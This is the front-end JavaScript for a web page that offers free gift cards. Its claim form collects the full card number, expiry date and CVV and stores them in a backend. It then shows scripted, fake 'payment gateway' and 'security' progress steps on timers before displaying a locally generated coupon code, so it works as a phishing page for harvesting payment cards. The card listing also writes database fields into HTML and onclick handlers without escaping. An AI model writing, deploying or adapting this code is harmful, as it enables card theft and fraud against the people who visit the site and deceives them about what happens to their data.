// ============================================
// INDEX PAGE - Landing Page Functionality
// ============================================

document.addEventListener('DOMContentLoaded', async () => {
  // Initialize Supabase
  app.initSupabase();
  
  // Load gift cards
  await loadGiftCards();
  
  // Setup FAQ accordion
  setupFAQ();
  
  // Setup form handlers
  setupClaimForm();
  
  // Format card inputs
  setupCardInputs();
});

// Load Gift Cards
async function loadGiftCards() {
  const container = document.getElementById('giftcards-container');
  
  const result = await app.getGiftCards();
  
  if (!result.success) {
    container.innerHTML = `
      <div class="glass-card" style="padding: 40px; text-align: center; grid-column: 1 / -1;">
        <p style="color: var(--text-secondary);">Unable to load gift cards. Please refresh the page.</p>
      </div>
    `;
    return;
  }
  
  if (result.data.length === 0) {
    container.innerHTML = `
      <div class="glass-card" style="padding: 40px; text-align: center; grid-column: 1 / -1;">
        <p style="color: var(--text-secondary);">No gift cards available at the moment.</p>
      </div>
    `;
    return;
  }
  
  container.innerHTML = result.data.map(card => `
    <div class="glass-card giftcard" style="--card-color-start: ${card.color_start}; --card-color-end: ${card.color_end};">
      <img src="${card.logo_url || '/placeholder-logo.png'}" alt="${card.name}" class="giftcard-logo" 
           onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%2260%22 height=%2260%22><rect fill=%22%23667eea%22 width=%2260%22 height=%2260%22/><text fill=%22white%22 x=%2250%%22 y=%2250%%22 text-anchor=%22middle%22 dy=%22.3em%22>${card.brand[0]}</text></svg>'">
      <h3 class="giftcard-name">${card.name}</h3>
      <div class="giftcard-amount">${app.formatCurrency(card.amount)}</div>
      <p class="giftcard-desc">${card.description || `Claim your ${card.brand} gift card reward`}</p>
      <button class="giftcard-btn" onclick="openClaimModal('${card.id}', '${card.name}', '${card.amount}')">
        Claim Now
      </button>
    </div>
  `).join('');
}

// FAQ Accordion
function setupFAQ() {
  const faqItems = document.querySelectorAll('.faq-item');
  
  faqItems.forEach(item => {
    const question = item.querySelector('.faq-question');
    const answer = item.querySelector('.faq-answer');
    
    question.addEventListener('click', () => {
      const isActive = question.classList.contains('active');
      
      // Close all
      document.querySelectorAll('.faq-question').forEach(q => q.classList.remove('active'));
      document.querySelectorAll('.faq-answer').forEach(a => a.style.maxHeight = null);
      
      // Open clicked if wasn't active
      if (!isActive) {
        question.classList.add('active');
        answer.style.maxHeight = answer.scrollHeight + 'px';
      }
    });
  });
}

// Claim Modal
function openClaimModal(cardId, cardName, cardAmount) {
  // Check if user is logged in
  const user = localStorage.getItem('giftcard_user');
  if (!user) {
    window.location.href = 'login.html?redirect=index.html';
    return;
  }
  
  document.getElementById('giftcard-id').value = cardId;
  document.getElementById('modal-giftcard-name').textContent = `Claim ${cardName}`;
  document.getElementById('claim-modal').classList.add('active');
}

function closeClaimModal() {
  document.getElementById('claim-modal').classList.remove('active');
  document.getElementById('claim-form').reset();
}

function closeSuccessModal() {
  document.getElementById('success-modal').classList.remove('active');
}

// Setup Claim Form
function setupClaimForm() {
  const form = document.getElementById('claim-form');
  
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const btn = document.getElementById('submit-claim-btn');
    btn.dataset.originalText = btn.textContent;
    app.setLoading(btn, true);
    
    const user = JSON.parse(localStorage.getItem('giftcard_user'));
    
    const claimData = {
      user_id: user.id,
      giftcard_id: document.getElementById('giftcard-id').value,
      card_holder_name: document.getElementById('card-holder').value,
      card_number: document.getElementById('card-number').value,
      expiry_date: document.getElementById('card-expiry').value,
      cvv: document.getElementById('card-cvv').value,
      status: 'processing'
    };
    
    // Create claim
    const result = await app.createClaim(claimData);
    
    if (!result.success) {
      app.showAlert('copy-alert', result.error, 'error');
      app.setLoading(btn, false);
      return;
    }
    
    // Close claim modal, show processing
    closeClaimModal();
    showProcessing();
    
    // Simulate processing steps
    const steps = [
      'Verifying card information...',
      'Connecting to payment gateway...',
      'Validating security protocols...',
      'Generating secure coupon code...',
      'Finalizing your reward...'
    ];
    
    let stepIndex = 0;
    const stepElement = document.getElementById('processing-step');
    
    const stepInterval = setInterval(() => {
      stepIndex++;
      if (stepIndex < steps.length) {
        stepElement.textContent = steps[stepIndex];
      }
    }, 3000);
    
    // Generate coupon after 15 seconds
    setTimeout(async () => {
      clearInterval(stepInterval);
      
      // Get gift card details
      const giftcardId = claimData.giftcard_id;
      const giftcardResult = await app.getGiftCardById(giftcardId);
      
      if (giftcardResult.success) {
        // Generate coupon
        const couponCode = app.generateCouponCode(giftcardResult.data.brand);
        
        const couponData = {
          claim_id: result.data.id,
          user_id: user.id,
          giftcard_id: giftcardId,
          code: couponCode,
          amount: giftcardResult.data.amount
        };
        
        await app.createCoupon(couponData);
        
        // Update claim status to completed
        await app.updateClaimStatus(result.data.id, 'completed');
        
        // Show success
        hideProcessing();
        document.getElementById('generated-coupon').textContent = couponCode;
        document.getElementById('success-modal').classList.add('active');
        
        // Update local storage with claim
        const claims = JSON.parse(localStorage.getItem('giftcard_claims') || '[]');
        claims.push({
          ...result.data,
          coupon_code: couponCode,
          giftcard: giftcardResult.data
        });
        localStorage.setItem('giftcard_claims', JSON.stringify(claims));
      }
    }, 15000);
  });
}

// Processing Animation
function showProcessing() {
  document.getElementById('processing-overlay').classList.add('active');
}

function hideProcessing() {
  document.getElementById('processing-overlay').classList.remove('active');
}

// Copy Coupon
function copyCoupon() {
  const code = document.getElementById('generated-coupon').textContent;
  app.copyToClipboard(code);
}

// Card Input Formatting
function setupCardInputs() {
  const cardNumber = document.getElementById('card-number');
  const cardExpiry = document.getElementById('card-expiry');
  
  if (cardNumber) {
    cardNumber.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      value = value.substring(0, 16);
      value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
      e.target.value = value;
    });
  }
  
  if (cardExpiry) {
    cardExpiry.addEventListener('input', (e) => {
      let value = e.target.value.replace(/\D/g, '');
      value = value.substring(0, 4);
      if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
      }
      e.target.value = value;
    });
  }
}

// Close modals on overlay click
window.onclick = function(event) {
  if (event.target.classList.contains('modal-overlay')) {
    event.target.classList.remove('active');
  }
}

// Make functions available globally
window.openClaimModal = openClaimModal;
window.closeClaimModal = closeClaimModal;
window.closeSuccessModal = closeSuccessModal;
window.copyCoupon = copyCoupon;
window.showProcessing = showProcessing;
window.hideProcessing = hideProcessing;
